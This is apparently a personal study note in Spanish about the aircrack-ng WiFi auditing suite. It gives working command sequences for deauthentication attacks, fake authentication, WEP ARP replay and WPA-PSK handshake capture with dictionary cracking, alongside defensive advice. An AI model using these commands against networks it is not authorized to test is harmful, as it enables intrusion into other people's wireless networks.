---
title: aircrack-ng
area: ciberseguridad
tipo: herramienta
tags: [ciberseguridad, red-team, redes]
created: 2026-01-19
updated: 2026-09-20
related: ["[[MOC-ciberseguridad]]", "[[red-team-killchain]]", "[[Nmap]]", "[[Wireshark]]"]
---

Suite de herramientas para **auditoría WiFi**, enfocada en redes **802.11**. Permite capturar tráfico, evaluar seguridad y crackear claves WEP o WPA-PSK mediante análisis de Handshake.

Incluye varias utilidades: captura, inyección, monitoreo, análisis y ataque.


https://youtu.be/nsmSZPLhGGU?si=5mZ6Vcbyo38IX6_L
https://youtu.be/gyItgM_Qkj4?si=MHhQFIRckv3oR9lm
---

## Componentes principales

- **airmon-ng**: habilita modo monitor
    
- **airodump-ng**: captura paquetes y Handshakes
    
- **aireplay-ng**: inyección y ataques
    
- **aircrack-ng**: crackeo de claves usando Handshake
    
- **airbase-ng**: AP falso (Evil AP)
    
- **airdecap-ng**: desencriptar capturas
    

---

## Flujo básico WPA-PSK

1. **Modo monitor**
    

`airmon-ng start wlan0`

Genera algo como `wlan0mon`

2. **Captura de Handshake**
    

`airodump-ng wlan0mon`

Filtra canal y objetivo:

`airodump-ng --bssid <MAC_AP> -c <CANAL> -w captura wlan0mon`

3. **Forzar desasociación (opcional)**
    

`aireplay-ng -0 5 -a <MAC_AP> -c <MAC_CLIENTE> wlan0mon`

4. **Crackeo**
    

`aircrack-ng captura-01.cap -w diccionario.txt`

---

## Ataques útiles con Aireplay-ng

- **Deauth** (forzar Handshake)
    

`aireplay-ng -0 10 -a <MAC_AP> -c <MAC_CLIENTE> wlan0mon`

- **Fake auth**
    

`aireplay-ng -1 30 -a <MAC_AP> -h <MAC_PROPIA> wlan0mon`

- **ARP replay (WEP)**
    

`aireplay-ng -3 -b <MAC_AP> -h <MAC_PROPIA> wlan0mon`

---

## Análisis de captura con Aircrack-ng

Ver Handshake:

`aircrack-ng captura-01.cap`

Si hay Handshake:

- `WPA handshake: <MAC>`
    

---

## WEP (histórico, pero educativo)

Flujo:

1. Captura paquetes e IVs:
    

`airodump-ng -c <CANAL> --bssid <MAC_AP> -w captura wlan0mon`

2. Inyectar para generar tráfico:
    

`aireplay-ng -3 -b <MAC_AP> -h <MAC_PROPIA> wlan0mon`

3. Crack:
    

`aircrack-ng captura-01.cap`

---

## Cosas a tener claras

- WPA-PSK **no se crackea directo**, se obtiene Handshake y se intenta key por diccionario
    
- La efectividad depende de la **calidad del diccionario**
    
- WPA2-Enterprise es **otro juego** (requiere ataques adicionales)
    
- La interfaz debe soportar **modo monitor** e **inyección**
    
- Requiere estar **cerca** del objetivo (capa física importa)
    

---

## Hardware recomendado

- Adaptadores con chipset **Atheros**, **Ralink**, **Realtek RTL8812AU**
    
- Compatibles con modo monitor e inyección
    

---

## Buenas prácticas de auditoría

- Prueba con tu propia red
    
- Usa diccionarios generados según patrón (Rockyou, mask attacks, etc.)
    
- Cambia tu router a **WPA2 o WPA3** con contraseña robusta
    
- Deshabilita WPS
    

---

## Límites reales

- Sin Handshake no hay ataque WPA
    
- Contraseñas largas y aleatorias hacen inútil diccionario
    
- No rompe WPA3 de forma trivial
    
- No sirve para "hackear WiFi" mágico, es solo auditoría
    

---

## Ver también

- [[MOC-ciberseguridad]]
- [[red-team-killchain]]
- [[Nmap]]
- [[Wireshark]]
